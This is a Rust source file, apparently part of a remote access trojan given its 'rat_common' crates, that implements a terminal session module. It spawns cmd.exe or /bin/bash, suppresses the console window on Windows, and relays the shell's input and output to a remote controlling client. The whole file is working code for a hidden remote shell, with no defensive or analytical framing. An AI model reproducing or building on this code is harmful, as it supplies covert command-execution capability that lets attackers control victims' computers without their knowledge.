use std::process::Stdio;
use std::sync::{Arc, Weak};

use async_trait::async_trait;
use rat_common::framework::{ModuleImpl, ModuleState};
use rat_common::reader::Reader;
use rat_common::schema::{
    ClientMessage, ClientMessageData, SessionInput, SessionMetadata, SessionMetadataInner,
    SessionOutput,
};
use rat_common::snowflake::SnowflakeId;
use tokio::io::AsyncWriteExt;
use tokio::process::{Child, ChildStderr, ChildStdin, ChildStdout, Command};
use tokio::sync::Mutex;

use crate::client::Client;
use crate::sessions::SessionImpl;

fn default_shell() -> &'static str {
    #[cfg(windows)]
    {
        "cmd.exe"
    }
    #[cfg(unix)]
    {
        "/bin/bash"
    }
}

pub struct TerminalSession {
    _client: Weak<Client>,
    _metadata: Arc<SessionMetadata>,
    _name: String,
    _process: Mutex<Child>,
    _input: Mutex<ChildStdin>,
    _output: Mutex<(Reader<ChildStdout>, Reader<ChildStderr>)>,
    _state: Arc<ModuleState>,
}

impl TerminalSession {
    pub async fn new(client: Weak<Client>) -> anyhow::Result<Self> {
        let mut command = Command::new(default_shell());
        command
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .kill_on_drop(true);

        #[cfg(windows)]
        {
            const CREATE_NO_WINDOW: u32 = 0x08000000;
            command.creation_flags(CREATE_NO_WINDOW);
        }

        let mut process = command.spawn()?;
        let stdin = process
            .stdin
            .take()
            .ok_or_else(|| anyhow::anyhow!("Failed to capture stdin"))?;
        let stdout = process
            .stdout
            .take()
            .ok_or_else(|| anyhow::anyhow!("Failed to capture stdout"))?;
        let stderr = process
            .stderr
            .take()
            .ok_or_else(|| anyhow::anyhow!("Failed to capture stderr"))?;

        let id = SnowflakeId::new();
        let pid = process.id().unwrap_or(u32::MAX);
        let name = format!("TerminalSession(id={id}, pid={pid})");

        Ok(Self {
            _client: client,
            _metadata: Arc::new(SessionMetadata {
                id,
                inner: SessionMetadataInner::Terminal { pid },
            }),
            _name: name,
            _process: Mutex::new(process),
            _input: Mutex::new(stdin),
            _output: Mutex::new((Reader::new(stdout), Reader::new(stderr))),
            _state: ModuleState::new(),
        })
    }
}

#[async_trait]
impl ModuleImpl for TerminalSession {
    type EventType = SessionOutput;

    fn name(&self) -> &str {
        &self._name
    }

    fn state(&self) -> Arc<ModuleState> {
        self._state.clone()
    }

    async fn listen(self: Arc<Self>) -> Self::EventType {
        let mut output = self._output.lock().await;
        let (stdout, stderr) = &mut *output;
        tokio::select! {
            Ok(size) = stdout.read() => {
                if size == 0 {
                    SessionOutput::TerminalClosed
                } else {
                    SessionOutput::TerminalStdout { data: stdout.prefix(size).to_vec() }
                }
            }
            Ok(size) = stderr.read() => {
                if size == 0 {
                    SessionOutput::TerminalClosed
                } else {
                    SessionOutput::TerminalStderr { data: stderr.prefix(size).to_vec() }
                }
            }
            else => SessionOutput::TerminalClosed,
        }
    }

    async fn handle(self: Arc<Self>, event: Self::EventType) -> anyhow::Result<()> {
        if let Some(client) = self._client.upgrade() {
            let message = ClientMessage {
                id: SnowflakeId::new(),
                data: ClientMessageData::SessionOutput {
                    session_id: self._metadata.id,
                    output: event,
                },
            };
            client.send(&message).await?;
        }

        Ok(())
    }
}

#[async_trait]
impl SessionImpl for TerminalSession {
    fn metadata(&self) -> Arc<SessionMetadata> {
        self._metadata.clone()
    }

    async fn input(&self, data: SessionInput) -> anyhow::Result<()> {
        if let SessionInput::TerminalStdin { data } = data {
            let mut stdin = self._input.lock().await;
            stdin.write_all(&data).await?;
        }

        Ok(())
    }

    async fn close(&self) -> anyhow::Result<()> {
        self._process.lock().await.kill().await?;
        Ok(())
    }
}
